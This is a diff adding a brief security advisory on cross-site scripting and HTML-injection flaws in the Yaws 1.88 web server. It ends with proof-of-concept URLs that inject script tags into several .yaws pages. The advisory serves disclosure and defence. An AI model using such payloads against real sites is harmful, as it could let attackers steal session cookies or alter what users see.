@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/51276/info
+
+Yaws is prone to multiple cross-site scripting and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user. Other attacks are possible.
+
+Yaws 1.88 is vulnerable; other versions may be affected. 
+
+http://www.example.com/editTag.yaws?node=ALockedPage&tag=%3E%3C/pre%3E%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E
+http://www.example.com/showOldPage.yaws?node=home&index=%3E%3C/pre%3E%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E
+http://www.example.com/allRefsToMe.yaws?node=%3E%3C/pre%3E%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E
+http://www.example.com/editPage.yaws?node=home 
